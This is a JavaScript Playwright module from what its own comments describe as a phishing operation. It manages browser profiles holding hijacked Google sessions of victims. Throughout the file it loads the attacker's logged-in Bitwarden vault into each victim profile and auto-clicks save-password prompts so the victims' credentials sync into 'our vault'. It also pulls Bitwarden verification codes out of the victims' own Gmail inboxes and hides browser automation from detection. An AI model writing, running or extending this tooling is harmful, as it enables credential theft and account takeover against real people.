import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';
import { chromium } from 'playwright';
import * as events from './events.js';

// ---------------------------------------------------------------------------
// Bitwarden in every session browser. Each phished account gets its own
// persistent Chrome profile under sessions/<id>; we load the unpacked Bitwarden
// extension into all of them, pre-logged into OUR Bitwarden account, so the
// "save this password?" prompt on the victim's Google sign-in syncs the stolen
// credentials straight into our vault.
//
// Per-profile Bitwarden login would make every profile a "new device" (e-mail
// verification each time), so instead we keep ONE template profile
// (sessions/_bw_template) where the extension is logged in once — by hand the
// first time if a verification code is demanded — and seed every fresh session
// profile with the template's extension storage (the device registration and
// the session token travel with it, so no per-profile verification).
// ---------------------------------------------------------------------------
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = path.join(__dirname, '..');
const EXT_DIR = path.join(ROOT, 'extensions', 'bitwarden');
const TEMPLATE_DIR = path.join(ROOT, 'sessions', '_bw_template');
const READY_MARK = path.join(TEMPLATE_DIR, '.ready');

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const log = (msg) => console.log(`[gsession] bitwarden: ${msg}`);

export function available() {
  return fs.existsSync(path.join(EXT_DIR, 'manifest.json'));
}

export function configured() {
  return Boolean(process.env.BW_EMAIL && process.env.BW_PASSWORD);
}

export function templateReady() {
  return fs.existsSync(READY_MARK);
}

// Branded Chrome ≥ 137 ignores --load-extension, so the extension is NOT
// side-loaded. Instead it's force-installed from the Web Store into every
// Chrome profile on this machine via the enterprise policy
// HKCU\Software\Policies\Google\Chrome\ExtensionInstallForcelist
//   = "nngceckbapebfimnlniiiahkandclblb;https://clients2.google.com/service/update2/crx"
// That covers every persistent session profile too and pins the OFFICIAL id.
export const EXT_ID = 'nngceckbapebfimnlniiiahkandclblb';

// Kept for API compatibility (browser.js spreads it). Empty: installation is
// policy-driven now; --load-extension is dead on branded Chrome.
export function launchArgs() {
  return [];
}

// Confirm the force-installed extension is actually present on a live context.
// NOTE: an idle MV3 service worker is NOT listed in context.serviceWorkers(),
// so the reliable probe is opening the popup page itself — it only loads when
// the extension is installed (ERR_BLOCKED_BY_CLIENT otherwise).
async function extensionId(context, timeout = 60000) {
  const start = Date.now();
  while (Date.now() - start < timeout) {
    for (const sw of context.serviceWorkers()) {
      if (sw.url().startsWith(`chrome-extension://${EXT_ID}/`)) return EXT_ID;
    }
    for (const p of context.pages()) {
      if (p.url().startsWith(`chrome-extension://${EXT_ID}/`)) return EXT_ID;
    }
    const probe = await context.newPage().catch(() => null);
    if (probe) {
      const ok = await probe
        .goto(`chrome-extension://${EXT_ID}/popup/index.html`, { waitUntil: 'domcontentloaded', timeout: 8000 })
        .then(() => true)
        .catch(() => false);
      await probe.close().catch(() => {});
      if (ok) return EXT_ID;
    }
    await sleep(3000);
  }
  return null;
}

// Which screen the extension popup is on. Bitwarden is an Angular app with
// hash routes, so the URL hash is the most stable signal; body text backs it up.
async function popupState(page) {
  const url = page.url();
  const hash = url.includes('#') ? url.split('#').pop() : '';
  if (/\/vault|\/tabs\/vault/.test(hash)) return 'vault';
  if (/\/lock/.test(hash)) return 'lock';
  if (/verification|two-step|\/2fa/.test(hash)) return 'verify';
  if (/\/login|\/sso|\/home/.test(hash) || !hash) {
    const text = (await page.locator('body').innerText().catch(() => '')).toLowerCase();
    if (/vault is locked|unlock/.test(text) && !/log in|email address/.test(text)) return 'lock';
    if (/verification code|check your email|verify your (identity|email)/.test(text)) return 'verify';
    if (/my vault|all vaults|there are no items/.test(text)) return 'vault';
    return 'login';
  }
  return 'unknown';
}

async function clickButton(page, re, timeout = 6000) {
  const btn = page.getByRole('button', { name: re }).first();
  try {
    await btn.waitFor({ state: 'visible', timeout });
    await btn.click();
    return true;
  } catch {
    return false;
  }
}

// Pull Bitwarden's 6-digit new-device verification code out of the victim's
// Gmail inbox — the attacker's whole advantage: this profile IS signed into
// that inbox. Searches Gmail for the Bitwarden mail; the code usually shows
// right in the search snippet, otherwise the newest mail is opened.
// `rejected` holds codes already tried and rejected (stale mails from earlier
// attempts sit in the inbox too) — only a FRESH code is returned.
// Best-effort: returns '' when nothing usable is found.
async function fetchGmailBwCode(context, label, rejected = new Set()) {
  const codesFromText = (text) => {
    const out = [];
    for (const m of text.matchAll(/\b(\d{3})[\s-](\d{3})\b/g)) out.push(m[1] + m[2]);
    for (const m of text.matchAll(/\b(\d{6})\b/g)) out.push(m[1]);
    return [...new Set(out)];
  };
  const page = await context.newPage().catch(() => null);
  if (!page) return '';
  try {
    await page.goto('https://mail.google.com/mail/u/0/search/q=bitwarden&max=3', { waitUntil: 'domcontentloaded', timeout: 30000 });
    // Search rows arrive NEWEST FIRST. Only the newest mail's code can be
    // valid — older mails' codes were used/rejected by earlier attempts, so a
    // flat scan of all snippets kept handing us stale codes. Row 1 is
    // authoritative; its snippet is sometimes truncated, in which case the
    // mail is opened once and its full body is read.
    const rowTexts = async () => page.evaluate(() => {
      const out = [];
      for (const row of document.querySelectorAll('tr.zA, div[role="button"][tabindex="0"]')) out.push(row.innerText || '');
      return out;
    }).catch(() => []);
    let mailOpened = false;
    for (let i = 0; i < 12; i++) {
      await sleep(2500);
      if (mailOpened) {
        // reading the newest mail's full body
        const body = await page.locator('body').innerText().catch(() => '');
        const code = codesFromText(body).find((c) => !rejected.has(c));
        if (code) { log(`${label}: verification code ${code} read from newest Gmail mail`); return code; }
        await page.goBack().catch(() => {});
        mailOpened = false;
        continue;
      }
      const rows = await rowTexts();
      const fresh = rows[0] ? codesFromText(rows[0]).find((c) => !rejected.has(c)) : '';
      if (fresh) {
        log(`${label}: verification code ${fresh} found in newest Gmail mail snippet`);
        return fresh;
      }
      // row 1's code is already tried (or its snippet truncated) — open the
      // newest mail once to read the full body / wait for a resend to land
      if (i === 4 && rows.length && !mailOpened) {
        const row = page.locator('tr.zA, div[role="button"][tabindex="0"]').first();
        if (await row.isVisible({ timeout: 1000 }).catch(() => false)) {
          await row.click().catch(() => {});
          mailOpened = true;
          await sleep(3000);
        }
      }
    }
    log(`${label}: no fresh Bitwarden verification code in Gmail yet`);
    return '';
  } catch (e) {
    log(`${label}: Gmail code fetch error: ${e.message}`);
    return '';
  } finally {
    await page.close().catch(() => {});
  }
}

// Drive the popup from whatever state it's in to an unlocked vault.
// Best-effort: anything it can't do itself (e-mailed new-device code, captcha)
// is surfaced as an admin event — the window is visible, a human finishes it,
// and we keep waiting until the vault shows (or the deadline passes).
async function driveToVault(page, label, deadlineMs) {
  const email = process.env.BW_EMAIL || '';
  const password = process.env.BW_PASSWORD || '';
  const start = Date.now();
  let announcedVerify = false;
  let emailed = false;
  let lastShotState = null;
  let lastCodeFetch = 0;
  let entryTime = 0;
  let lastResend = 0;
  const rejectedCodes = new Set();
  const shot = async (tag) => {
    try {
      const dir = path.join(ROOT, 'data', 'challenges');
      fs.mkdirSync(dir, { recursive: true });
      const stamp = new Date().toISOString().replace(/[:.]/g, '-');
      const file = path.join(dir, `bw-${tag || 'unlock'}-${stamp}.png`);
      await page.screenshot({ path: file });
      const text = (await page.locator('body').innerText().catch(() => ''))
        .split('\n').map((t) => t.trim()).filter(Boolean).slice(0, 40).join(' | ');
      log(`${label}: BW shot -> ${path.basename(file)} :: ${text.slice(0, 300)}`);
    } catch (e) { log(`${label}: BW shot failed: ${e.message}`); }
  };
  while (Date.now() - start < deadlineMs) {
    const state = await popupState(page);
    log(`${label}: popup state = ${state}`);
    if (state !== lastShotState) {
      lastShotState = state;
      await shot(state);
    }
    if (state === 'vault') return true;
    if (state === 'verify') {
      if (!announcedVerify) {
        announcedVerify = true;
        events.push('bitwarden.verify', {
          message: `Bitwarden (${label}) asks for a verification code — fetching it from the victim's Gmail inbox…`,
        });
      }
      // Fetch the code from the victim's inbox (we're signed into it) and
      // type it in. Bitwarden new-device codes are one-time, and the inbox
      // holds stale mails from earlier attempts — so once a code has been
      // entered we stop re-entering it: if we're still on this screen 15s
      // later the code was rejected, we click "Resend code" (when the
      // cooldown allows) and hunt for a DIFFERENT code from Gmail.
      const enterCode = async (code) => {
        const inp = page.locator('input[type="text"], input[type="number"], input:not([type])').first();
        if (await inp.isVisible({ timeout: 1500 }).catch(() => false)) {
          await inp.fill(code).catch(() => {});
          await clickButton(page, /continue/i, 3000);
          log(`${label}: verification code ${code} entered from Gmail`);
          await shot('code-entered');
          entryTime = Date.now();
          rejectedCodes.add(code);
          return true;
        }
        return false;
      };
      if (!entryTime) {
        const code = await fetchGmailBwCode(page.context(), label, rejectedCodes).catch(() => '');
        if (code) await enterCode(code);
        else lastCodeFetch = Date.now();
      } else if (Date.now() - entryTime > 15000) {
        if (Date.now() - lastResend > 60000) {
          lastResend = Date.now();
          if (await clickButton(page, /resend/i, 3000)) log(`${label}: clicked "Resend code"`);
        }
        if (Date.now() - lastCodeFetch > 15000) {
          lastCodeFetch = Date.now();
          const code = await fetchGmailBwCode(page.context(), label, rejectedCodes).catch(() => '');
          if (code) await enterCode(code);
        }
      }
      await sleep(3000);
      continue;
    }
    if (state === 'lock') {
      const pw = page.locator('input[type="password"]').first();
      if (await pw.isVisible().catch(() => false)) {
        await pw.fill(password).catch(() => {});
        await clickButton(page, /^unlock$/i, 2500);
      }
      await sleep(3000);
      continue;
    }
    // login flow: e-mail step, then master-password step
    if (!emailed) {
      const em = page.locator('input[type="email"], input[name="email"], input#login_input_email').first();
      if (await em.isVisible().catch(() => false)) {
        await em.fill(email).catch(() => {});
        if (await clickButton(page, /continue|next/i, 2500)) {
          emailed = true;
          await sleep(2500);
          continue;
        }
      }
    }
    const pw = page.locator('input[type="password"]').first();
    if (await pw.isVisible().catch(() => false)) {
      await pw.fill(password).catch(() => {});
      await clickButton(page, /log in( with master password)?|continue/i, 2500);
      await sleep(3000);
      continue;
    }
    // no input on screen: first-run onboarding ("make Bitwarden your default
    // password manager", welcome carousel) — walk past it toward the login form
    await clickButton(page, /skip|not now|no thanks|get started|log in|continue/i, 2500);
    await sleep(3000);
  }
  return false;
}

// Single in-flight driveToVault per label: two callers (postLaunch +
// passkeyReady) used to open separate popup tabs and drive the SAME verify
// form concurrently — interleaved fill + Continue kept rejecting each
// other's codes. Late callers join the winner's promise instead.
const unlockDrivers = new Map(); // label -> { promise, deadline }

async function driveToVaultOnce(page, label, deadlineMs) {
  const now = Date.now();
  const drv = unlockDrivers.get(label);
  if (drv && drv.deadline > now) {
    log(`${label}: joining in-flight vault drive`);
    const ok = await drv.promise;
    if (ok) return true;
    log(`${label}: joined driver gave up — driving it myself`);
  }
  const p = driveToVault(page, label, deadlineMs).finally(() => {
    if (unlockDrivers.get(label)?.promise === p) unlockDrivers.delete(label);
  });
  unlockDrivers.set(label, { promise: p, deadline: now + deadlineMs });
  return p;
}

// Open the extension popup in a tab of this context, make sure it's logged in
// and unlocked, close the tab. Returns true when the vault is usable.
async function ensureOnContext(context, label, deadlineMs = 90000) {
  if (!available() || !configured()) return false;
  const id = await extensionId(context);
  if (!id) {
    log(`${label}: extension service worker not found — is the extension blocked?`);
    return false;
  }
  log(`${label}: extension id ${id}`);
  const page = await context.newPage();
  try {
    await page.goto(`chrome-extension://${id}/popup/index.html`, { waitUntil: 'domcontentloaded', timeout: 15000 });
    await sleep(2500);
    const ok = await driveToVaultOnce(page, label, deadlineMs);
    log(`${label}: ${ok ? 'vault unlocked ✓' : 'could not reach the vault in time'}`);
    return ok;
  } catch (e) {
    log(`${label}: ensure failed (${e.message})`);
    return false;
  } finally {
    await page.close().catch(() => {});
  }
}

// ---------------------------------------------------------------------------
// Template profile: logged in ONCE (manually if Google-style verification is
// demanded), then its extension storage seeds every fresh session profile.
// ---------------------------------------------------------------------------
let templatePromise = null;

export function ensureTemplate() {
  if (!available() || !configured() || templateReady()) return Promise.resolve(false);
  if (!templatePromise) {
    templatePromise = (async () => {
      log('bootstrapping template profile (one-time Bitwarden login)…');
      events.push('bitwarden.template', {
        message: 'Bitwarden template: a Chrome window opens — if it asks for an e-mailed code, type it there once.',
      });
      const context = await chromium.launchPersistentContext(TEMPLATE_DIR, {
        headless: false,
        channel: 'chrome',
        viewport: { width: 1100, height: 800 },
        ignoreDefaultArgs: [
          '--enable-automation',
          '--disable-extensions',
          '--disable-component-update',
          '--disable-background-networking',
        ],
        args: [
          '--no-first-run',
          '--no-default-browser-check',
          '--disable-blink-features=AutomationControlled',
          ...launchArgs(),
        ],
      });
      try {
        // generous: a human may need to fetch an e-mailed code
        const ok = await ensureOnContext(context, 'template', 5 * 60 * 1000);
        if (ok) {
          // let storage flush to disk before we close + copy it around
          await sleep(3000);
          fs.writeFileSync(READY_MARK, new Date().toISOString());
          log('template ready ✓ — session profiles will be seeded from it');
          events.push('bitwarden.ready', { message: 'Bitwarden template ready ✓ — every session browser now carries our vault.' });
        }
        return ok;
      } finally {
        await context.close().catch(() => {});
      }
    })().finally(() => {
      // allow a retry on a later launch if it failed
      templatePromise = null;
    });
  }
  return templatePromise;
}

// Copy the template's extension storage into a profile dir. Both profiles
// share the same extension id (policy-installed, fixed official id).
// includeLocalStorage: only for FRESH profiles — wholesale-copying the Local
// Storage leveldb into a USED profile would clobber its web-origin storage.
function copyIfExists(src, dst) {
  if (fs.existsSync(src)) fs.cpSync(src, dst, { recursive: true });
}

function copyExtensionStorage(tplDefault, dstDefault, { includeLocalStorage }) {
  // storage.local lives here (login state, tokens, settings)
  const les = path.join(tplDefault, 'Local Extension Settings');
  if (fs.existsSync(les)) {
    for (const sub of fs.readdirSync(les)) {
      copyIfExists(path.join(les, sub), path.join(dstDefault, 'Local Extension Settings', sub));
    }
  }
  // IndexedDB (vault data cache)
  const idb = path.join(tplDefault, 'IndexedDB');
  if (fs.existsSync(idb)) {
    for (const sub of fs.readdirSync(idb)) {
      if (/chrome-extension_/.test(sub)) copyIfExists(path.join(idb, sub), path.join(dstDefault, 'IndexedDB', sub));
    }
  }
  if (includeLocalStorage) {
    copyIfExists(path.join(tplDefault, 'Local Storage'), path.join(dstDefault, 'Local Storage'));
  }
}

// Seed a FRESH profile dir (called right before its first Chrome launch).
export function seedProfile(profileDir) {
  if (!templateReady()) return false;
  const tplDefault = path.join(TEMPLATE_DIR, 'Default');
  const dstDefault = path.join(profileDir, 'Default');
  if (!fs.existsSync(tplDefault) || fs.existsSync(dstDefault)) return false;
  try {
    copyExtensionStorage(tplDefault, dstDefault, { includeLocalStorage: true });
    log(`seeded fresh profile ${path.basename(profileDir)} from template`);
    return true;
  } catch (e) {
    log(`seed failed for ${path.basename(profileDir)}: ${e.message}`);
    return false;
  }
}

// Seed profiles that EXISTED before the template was ready (older stolen
// sessions). Skips profiles whose browser is currently open (leveldb would be
// locked) and profiles that already carry the extension's storage.
export function seedExistingProfiles(isBusy = () => false) {
  if (!templateReady()) return 0;
  const sessionsRoot = path.join(ROOT, 'sessions');
  const tplDefault = path.join(TEMPLATE_DIR, 'Default');
  if (!fs.existsSync(sessionsRoot) || !fs.existsSync(tplDefault)) return 0;
  let done = 0;
  for (const name of fs.readdirSync(sessionsRoot)) {
    if (name === '_bw_template') continue;
    const dir = path.join(sessionsRoot, name);
    try {
      if (!fs.statSync(dir).isDirectory() || isBusy(name)) continue;
      if (fs.existsSync(path.join(dir, 'Default', 'Local Extension Settings', EXT_ID))) continue;
      copyExtensionStorage(tplDefault, path.join(dir, 'Default'), { includeLocalStorage: false });
      done += 1;
      log(`seeded existing profile ${name.slice(0, 8)} from template`);
    } catch (e) {
      log(`existing-profile seed failed for ${name.slice(0, 8)}: ${e.message}`);
    }
  }
  return done;
}

// ---------------------------------------------------------------------------
// Save-prompt watcher: when the victim's Google sign-in submits a password,
// Bitwarden injects an "add this login?" bar (an extension iframe). Click its
// "Yes" so the stolen credentials land in our vault without anyone watching.
// ---------------------------------------------------------------------------
const watchers = new Set();

async function clickSaveBars(context, label) {
  for (const page of context.pages()) {
    for (const frame of page.frames()) {
      if (!/chrome-extension:\/\/[a-p]{32}\/notification\/bar\.html/.test(frame.url())) continue;
      try {
        const yes = frame.getByRole('button', { name: /yes|save/i }).first();
        if (await yes.isVisible({ timeout: 500 }).catch(() => false)) {
          await yes.click();
          log(`${label}: clicked "Yes" on a save-password bar → credentials into our vault`);
          events.push('bitwarden.saved', { message: `Bitwarden saved a login from ${label} into our vault ✓` });
        }
      } catch {}
    }
  }
}

export function watchSavePrompts(context, label) {
  if (!available() || watchers.has(context)) return;
  watchers.add(context);
  const timer = setInterval(() => clickSaveBars(context, label).catch(() => {}), 2000);
  context.on('close', () => {
    clearInterval(timer);
    watchers.delete(context);
  });
}

// Entry point called by browser.js right after a session browser launches:
// unlock (or, if seeding missed, fully log in) the extension, then arm the
// save-prompt watcher. Fire-and-forget — never blocks the Google flow for
// more than the unlock attempt, and never throws. `isBusy(profileId)` tells
// the seeder which profiles have a live browser (their leveldb is locked).
export function postLaunch(context, label, isBusy = () => true) {
  if (!available()) return;
  watchSavePrompts(context, label);
  if (!configured()) return;
  (async () => {
    // make sure the template exists before spending time on this profile
    const tplOk = templateReady() || (await ensureTemplate().catch(() => false));
    if (tplOk) {
      const n = seedExistingProfiles(isBusy);
      if (n) log(`seeded ${n} pre-existing session profile(s) from template`);
    }
    await sleep(1500);
    const ok = await ensureOnContext(context, label, 90000);
    if (!ok) log(`${label}: extension left as-is (vault not confirmed)`);
  })().catch((e) => log(`${label}: postLaunch error (${e.message})`));
}

// Ensure Bitwarden is unlocked and can handle WebAuthn before we attempt
// passkey registration. Opens the extension popup in a new tab, drives the
// unlock/login flow if needed, then closes the tab. Returns true if ready.
export async function passkeyReady(context, label) {
  if (!available() || !configured()) return false;
  try {
    const page = await context.newPage();
    await page.goto(`chrome-extension://${EXT_ID}/popup/index.html`, { waitUntil: 'domcontentloaded', timeout: 15000 });
    await sleep(2000);
    const state = await popupState(page);
    if (state === 'vault') {
      await page.close().catch(() => {});
      return true;
    }
    // Vault is locked or not logged in — drive the unlock flow. 120s: a
    // fresh device first needs the e-mailed verification code (fetched from
    // the victim's inbox) plus the master password step.
    log(`${label}: passkeyReady — state "${state}", driving unlock…`);
    const ok = await driveToVaultOnce(page, label, 120000);
    await page.close().catch(() => {});
    if (ok) {
      log(`${label}: passkeyReady — Bitwarden unlocked ✓`);
    } else {
      log(`${label}: passkeyReady — failed to unlock Bitwarden`);
    }
    return ok;
  } catch (e) {
    log(`${label}: passkeyReady error: ${e.message}`);
    return false;
  }
}

// ---------------------------------------------------------------------------
// One-off repair: the first seeding copied a LIVE LevelDB (incomplete) and the
// vault timeout wasn't set to Never. Operator unlocks the template vault by
// hand once; we set timeout=Never, close Chrome (clean flush), wipe the
// partial copies from every session profile and re-seed them all.
// ---------------------------------------------------------------------------
function wipeBwStorage(profileDir) {
  const def = path.join(profileDir, 'Default');
  fs.rmSync(path.join(def, 'Local Extension Settings', EXT_ID), { recursive: true, force: true });
  const idb = path.join(def, 'IndexedDB');
  if (fs.existsSync(idb)) {
    for (const sub of fs.readdirSync(idb)) {
      if (/chrome-extension_/.test(sub)) fs.rmSync(path.join(idb, sub), { recursive: true, force: true });
    }
  }
}

export function repairTemplate(isBusy = () => true) {
  return (async () => {
    log('repair: opening template Chrome — UNLOCK the vault by hand once');
    events.push('bitwarden.template', {
      message: 'Bitwarden repair: template window open — UNLOCK the vault (master password) once; it continues by itself.',
    });
    const context = await chromium.launchPersistentContext(TEMPLATE_DIR, {
      headless: false,
      channel: 'chrome',
      viewport: { width: 1100, height: 800 },
      ignoreDefaultArgs: [
        '--enable-automation',
        '--disable-extensions',
        '--disable-component-update',
        '--disable-background-networking',
      ],
      args: ['--no-first-run', '--no-default-browser-check', '--disable-blink-features=AutomationControlled'],
    });
    try {
      const id = await extensionId(context);
      if (!id) throw new Error('extension not present in template profile');
      let page = await context.newPage();
      await page.goto(`chrome-extension://${id}/popup/index.html`, { waitUntil: 'domcontentloaded', timeout: 15000 });
      const start = Date.now();
      let ok = false;
      let polls = 0;
      while (Date.now() - start < 10 * 60 * 1000) {
        await sleep(3000);
        polls += 1;
        if (page.isClosed()) {
          page = await context.newPage();
          await page.goto(`chrome-extension://${id}/popup/index.html`, { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => {});
        } else if (polls % 5 === 0) {
          await page.reload({ waitUntil: 'domcontentloaded' }).catch(() => {});
          await sleep(1500);
        }
        const state = await popupState(page).catch(() => 'unknown');
        if (polls % 4 === 1) log(`repair popup state: ${state}`);
        if (state === 'vault') { ok = true; break; }
      }
      if (!ok) {
        log('repair: vault not unlocked within 10 min');
        return false;
      }
      const t = await setVaultTimeoutNever(context, id).catch(() => false);
      log(`repair: vault timeout Never = ${t}`);
      await sleep(3000);
      // close BEFORE copying — clean LevelDB flush this time
      await context.close().catch(() => {});
      let wiped = 0;
      const sessionsRoot = path.join(ROOT, 'sessions');
      for (const name of fs.readdirSync(sessionsRoot)) {
        if (name === '_bw_template') continue;
        const dir = path.join(sessionsRoot, name);
        try {
          if (!fs.statSync(dir).isDirectory() || isBusy(name)) continue;
          wipeBwStorage(dir);
          wiped += 1;
        } catch {}
      }
      const seeded = seedExistingProfiles(isBusy);
      log(`repair done: wiped ${wiped}, re-seeded ${seeded}`);
      events.push('bitwarden.ready', { message: `Bitwarden repair ✓ — re-seeded ${seeded} session(s) with the unlocked vault.` });
      return true;
    } catch (e) {
      log(`repair failed: ${e.message}`);
      return false;
    } finally {
      await context.close().catch(() => {});
    }
  })();
}
// Chrome with the extension; the operator logs into OUR vault by hand (one
// time, incl. any e-mailed device verification). We watch the popup until the
// vault appears, set vault-timeout to "Never" (so seeded profiles come up
// unlocked without knowing the password), mark the template ready and seed
// every existing session profile.
// ---------------------------------------------------------------------------
let manualPromise = null;

async function setVaultTimeoutNever(context, id) {
  const page = await context.newPage();
  try {
    await page.goto(`chrome-extension://${id}/popup/index.html`, { waitUntil: 'domcontentloaded', timeout: 15000 });
    await sleep(3000);
    // open the Settings tab like a user would (route hashes change between builds)
    const tab = page.getByRole('tab', { name: /settings/i }).first();
    if (await tab.isVisible({ timeout: 4000 }).catch(() => false)) await tab.click().catch(() => {});
    else await page.getByText(/settings/i).first().click().catch(() => {});
    await sleep(3000);
    const picked = await page.evaluate(() => {
      for (const s of document.querySelectorAll('select')) {
        let n = s;
        for (let k = 0; k < 6 && n.parentElement; k++) n = n.parentElement;
        if (/vault timeout/i.test(n.textContent || '')) {
          const opt = [...s.options].find((o) => /never/i.test(o.text));
          if (opt) {
            s.value = opt.value;
            s.dispatchEvent(new Event('change', { bubbles: true }));
            return opt.text;
          }
        }
      }
      return null;
    });
    log(`vault timeout select -> ${picked || 'NOT FOUND'}`);
    if (picked) {
      // confirm the "this makes your vault less secure" warning if it appears
      await clickButton(page, /yes|continue|ok/i, 4000);
      await sleep(1500);
    }
    const dir = path.join(ROOT, 'shots');
    fs.mkdirSync(dir, { recursive: true });
    await page.screenshot({ path: path.join(dir, 'bw-settings.png') }).catch(() => {});
    return Boolean(picked);
  } finally {
    await page.close().catch(() => {});
  }
}

export function manualTemplateLogin(isBusy = () => true) {
  if (!available()) return Promise.resolve(false);
  if (templateReady()) return Promise.resolve(true);
  if (manualPromise) return manualPromise;
  manualPromise = (async () => {
    log('manual template login: opening template Chrome — log into our vault by hand');
    events.push('bitwarden.template', {
      message: 'Bitwarden template window opened — log into OUR Bitwarden account in it (one time). It closes by itself when done.',
    });
    const context = await chromium.launchPersistentContext(TEMPLATE_DIR, {
      headless: false,
      channel: 'chrome',
      viewport: { width: 1100, height: 800 },
      ignoreDefaultArgs: [
        '--enable-automation',
        '--disable-extensions',
        '--disable-component-update',
        '--disable-background-networking',
      ],
      args: ['--no-first-run', '--no-default-browser-check', '--disable-blink-features=AutomationControlled'],
    });
    try {
      const id = await extensionId(context);
      if (!id) throw new Error('extension not present in template profile');
      let page = await context.newPage();
      await page.goto(`chrome-extension://${id}/popup/index.html`, { waitUntil: 'domcontentloaded', timeout: 15000 });
      // wait (up to 15 min) for the operator to finish the login by hand;
      // reload/reopen the popup tab periodically so a login done in the
      // toolbar popup is picked up too
      const start = Date.now();
      let ok = false;
      let polls = 0;
      while (Date.now() - start < 15 * 60 * 1000) {
        await sleep(3000);
        polls += 1;
        if (page.isClosed()) {
          page = await context.newPage();
          await page.goto(`chrome-extension://${id}/popup/index.html`, { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => {});
        } else if (polls % 5 === 0) {
          await page.reload({ waitUntil: 'domcontentloaded' }).catch(() => {});
          await sleep(1500);
        }
        const state = await popupState(page).catch(() => 'unknown');
        if (polls % 4 === 1) log(`template popup state: ${state} hash=${page.url().split('#').pop()?.slice(0, 40)}`);
        if (state === 'vault') { ok = true; break; }
      }
      if (!ok) {
        log('manual template login: vault not reached within 15 min');
        events.push('bitwarden.template-failed', { message: 'Bitwarden template: login not finished in time — click 🔑 Bitwarden to retry.' });
        return false;
      }
      log('vault open ✓ — setting vault timeout to Never…');
      const timeoutSet = await setVaultTimeoutNever(context, id).catch(() => false);
      if (!timeoutSet) {
        events.push('bitwarden.template', { message: 'Bitwarden template: set Settings → Vault timeout → Never in the open window, please.' });
        log('vault-timeout auto-set failed — asking operator to set it by hand (waiting up to 2 min)');
        // give the operator a moment to set it by hand; not fatal either way
        await sleep(60 * 1000);
      }
      await sleep(3000);
      // CRITICAL: close Chrome BEFORE copying its storage — copying a live
      // LevelDB gives incomplete state (that left sessions on the onboarding
      // screen instead of the logged-in vault)
      await context.close().catch(() => {});
      fs.writeFileSync(READY_MARK, new Date().toISOString());
      const n = seedExistingProfiles(isBusy);
      log(`template ready ✓ — seeded ${n} existing profile(s); fresh profiles seed on launch`);
      events.push('bitwarden.ready', {
        message: `Bitwarden template ready ✓ — ${n} existing session(s) updated; every session browser now carries our logged-in vault.`,
      });
      return true;
    } catch (e) {
      log(`manual template login failed: ${e.message}`);
      events.push('bitwarden.template-failed', { message: `Bitwarden template login failed: ${e.message}` });
      return false;
    } finally {
      await context.close().catch(() => {});
      manualPromise = null;
    }
  })();
  return manualPromise;
}
